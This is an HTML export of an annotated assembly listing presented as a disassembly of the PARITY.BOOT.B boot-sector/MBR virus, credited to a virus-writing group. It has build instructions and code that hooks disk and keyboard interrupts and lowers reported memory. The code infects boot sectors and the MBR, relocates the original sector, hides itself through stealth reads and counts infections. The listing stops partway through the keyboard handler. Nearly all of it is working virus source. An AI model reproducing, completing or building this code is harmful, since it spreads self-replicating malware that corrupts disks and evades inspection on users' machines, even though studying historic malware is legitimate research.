<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;                                                                      25.12.98</span><span class="sc0">
</span><span class="sc1">;        ***   PARITY.BOOT.B disassembly by Evil-E [Codebreakers]   ***</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">; Type           : Boot/MBR resident, stealth</span><span class="sc0">
</span><span class="sc1">; Size           : 512 Bytes</span><span class="sc0">
</span><span class="sc1">; characteristic : coventional memory size decreased by 1 Kb</span><span class="sc0">
</span><span class="sc1">;                  Messages randomly "PARITY CHECK"</span><span class="sc0">
</span><span class="sc1">;                  CTRL-ALT-DEL calls a pseudeo reboot</span><span class="sc0">
</span><span class="sc1">;                  Debuggers don´t work proper</span><span class="sc0">
</span><span class="sc1">; hooked Ints    : 09h (Keyboard) is set to offset 7D62h</span><span class="sc0">
</span><span class="sc1">;                  13h (Disk) is set to offest 7C82h</span><span class="sc0">
</span><span class="sc1">;                  segments of 01h(single step) and 03h (breakpoint) </span><span class="sc0">
</span><span class="sc1">;                  are destroyed</span><span class="sc0">
</span><span class="sc1">; Origin         : germany</span><span class="sc0">
</span><span class="sc1">; Discovered     : late 1992</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling instructions</span><span class="sc0">
</span><span class="sc1">; Tasm  pbb.asm /m3</span><span class="sc0">
</span><span class="sc1">; Tlink pbb /m3</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc2">.8086</span><span class="sc0">
</span><span class="sc5">MODEL</span><span class="sc0"> </span><span class="sc10">TINY</span><span class="sc0">
</span><span class="sc5">CODESEG</span><span class="sc0">

</span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">             </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
 </span><span class="sc6">nop</span><span class="sc0">
 </span><span class="sc5">OEM_Name</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MSDOS5.0'</span><span class="sc0">             </span><span class="sc1">; OEM name and version</span><span class="sc0">
 </span><span class="sc5">Bytes_sec</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">                  </span><span class="sc1">; bytes per sector</span><span class="sc0">
 </span><span class="sc5">Sec_Cluster</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                    </span><span class="sc1">; sectors per cluster</span><span class="sc0">
 </span><span class="sc5">Reser_Sec</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">                  </span><span class="sc1">; number of reserved sectors</span><span class="sc0">
 </span><span class="sc5">Fats</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">                    </span><span class="sc1">; number of FAT's on disk</span><span class="sc0">
 </span><span class="sc5">Root_Entries</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">000e0h</span><span class="sc0">                 </span><span class="sc1">; number of root directory entries</span><span class="sc0">
 </span><span class="sc5">total_Sec</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00b40h</span><span class="sc0">                 </span><span class="sc1">; number of total sectors</span><span class="sc0">
 </span><span class="sc5">Media_Descrip</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">                   </span><span class="sc1">; media descriptor byte</span><span class="sc0">
 </span><span class="sc5">Sectors_FAT</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">00009h</span><span class="sc0">                 </span><span class="sc1">; sectors per FAT</span><span class="sc0">
 </span><span class="sc5">sec_Track</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0012h</span><span class="sc0">                  </span><span class="sc1">; sectors per track</span><span class="sc0">
 </span><span class="sc5">Heads</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0002h</span><span class="sc0">                  </span><span class="sc1">; number of heads </span><span class="sc0">
 </span><span class="sc5">Hidden_Sec</span><span class="sc0">      </span><span class="sc9">Dd</span><span class="sc0"> </span><span class="sc2">00000000</span><span class="sc0">               </span><span class="sc1">; number of hidden sectors</span><span class="sc0">
 </span><span class="sc5">NSec</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">                     </span><span class="sc1">; (DOS 4+) number of sectors</span><span class="sc0">
 </span><span class="sc5">Drive</span><span class="sc0">           </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">                     </span><span class="sc1">; (DOS 4+) physical drive number</span><span class="sc0">
 </span><span class="sc5">reserved</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                    </span><span class="sc1">; (DOS 4+) reserved</span><span class="sc0">
 </span><span class="sc5">Signature</span><span class="sc0">       </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">029h</span><span class="sc0">                   </span><span class="sc1">; (DOS 4+) signature byte (29h)</span><span class="sc0">
 </span><span class="sc5">Serial_Number</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">1f6d10e4h</span><span class="sc0">              </span><span class="sc1">; (DOS 4+) volume serial number</span><span class="sc0">
 </span><span class="sc5">Volume_Label</span><span class="sc0">    </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc12">'PARITYBOOTBFAT12   '</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cli</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">; CS=0 on startup</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">004Ch</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; get old int 13h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldint13</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; save</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">004Eh</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oldint13</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">046Eh</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; clock tick HiByte (hours)</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> 
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0413h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; memsize in Kb</span><span class="sc0">
  </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                  </span><span class="sc1">; -1 KB</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0413h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc0">
  </span><span class="sc6">shl</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">07C0h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">004Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; set new Int 13h (Disk) hi</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0026h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; set new Int 09h (Keyboard) hi</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">004Ch</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int13</span><span class="sc4">+</span><span class="sc2">7C00h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0024h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">keyboard</span><span class="sc4">+</span><span class="sc2">7C00h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
  </span><span class="sc6">cld</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">                                  </span><span class="sc1">; copy to TOM</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">19h</span><span class="sc0">                                 </span><span class="sc1">; reboot system</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">

</span><span class="sc5">Int13</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">no_check</span><span class="sc0">
  </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">no_check</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                              </span><span class="sc1">; read ?</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Exit_Int13</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">                            </span><span class="sc1">; track 0 sector 1 ?</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Exit_Int13</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                              </span><span class="sc1">; head 0</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Exit_Int13</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">pushf</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldint13</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; read bootsector</span><span class="sc0">
  </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">no_Error</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc10">Error</span><span class="sc0">
</span><span class="sc5">no_Error</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">Boot_signature</span><span class="sc4">],</span><span class="sc2">0AA55h</span><span class="sc0">     </span><span class="sc1">; is it a boot_sector ?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Boot_Signature_ok</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">exit</span><span class="sc0">
</span><span class="sc5">Boot_Signature_ok</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">infection_signature</span><span class="sc4">],</span><span class="sc2">0C9h</span><span class="sc0"> </span><span class="sc1">; already infected ?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">stealth</span><span class="sc0">                                    </span><span class="sc1">; yep -&gt; stealth</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Find_MBR</span><span class="sc0">                                   </span><span class="sc1">; find new place for org. bootsector</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">write_MBR</span><span class="sc0">                                  </span><span class="sc1">; write org. bootsector to new place</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">079h</span><span class="sc0">                                    </span><span class="sc1">; HD ?</span><span class="sc0">
  </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">PartitionsCopy</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                                   </span><span class="sc1">; else copy boot record</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">7C02h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">001Eh</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Copy</span><span class="sc0">

</span><span class="sc5">Exit_int13</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">
  </span><span class="sc5">oldint13</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Jmp Far to the orginal INT 13 Handler</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
  </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
  </span><span class="sc6">retf</span><span class="sc0">   </span><span class="sc2">0002h</span><span class="sc0">

</span><span class="sc5">PartitionsCopy</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Partitions_Table</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Partitions_Table</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Copy</span><span class="sc0">

</span><span class="sc5">Write_MBR</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">                         </span><span class="sc1">; write sector</span><span class="sc0">
  </span><span class="sc6">pushf</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldint13</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">no_error1</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Exit</span><span class="sc0">

</span><span class="sc5">no_error1</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Copy</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">         </span><span class="sc1">; copy boot record or  the partition table</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc0">         </span><span class="sc1">; of the org. boot sector/MBR in virii code</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">cld</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc5">retry</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">               </span><span class="sc1">;track 0, sector 1</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">                           </span><span class="sc1">;write 1 sector</span><span class="sc0">
  </span><span class="sc6">pushf</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldint13</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; write virii</span><span class="sc0">
  </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">retry</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; inc infection counter :)</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">exit</span><span class="sc0">

  </span><span class="sc1">; this is the message (PARITY CHECK) XOR 55H</span><span class="sc0">
  </span><span class="sc5">message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">01Ch</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01Dh</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">01Eh</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">


</span><span class="sc5">stealth</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Find_MBR</span><span class="sc0">                         </span><span class="sc1">; find place where org. boot is stored</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">pushf</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oldint13</span><span class="sc4">+</span><span class="sc2">07C00h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; read</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
  </span><span class="sc6">retf</span><span class="sc0">   </span><span class="sc2">0002</span><span class="sc0">

</span><span class="sc5">find_MBR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc0">                   </span><span class="sc1">; &gt;79 means HD</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Harddisk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Sectors/FAT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">; 720Kb disc</span><span class="sc0">
    </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">HD_Disk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">; head 1, track 0, sector 3</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">HD_Disk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">Harddisk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">                    </span><span class="sc1">; 360Kb disc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Harddisk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">                   </span><span class="sc1">; HD or 1,44Mb disc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">KeyBoard</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0417h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; keyboard shift status</span><span class="sc0">
  </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                          </span><span class="sc1">; CTRL+ALT pressed?</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">no_reboot</span><span class="sc0">
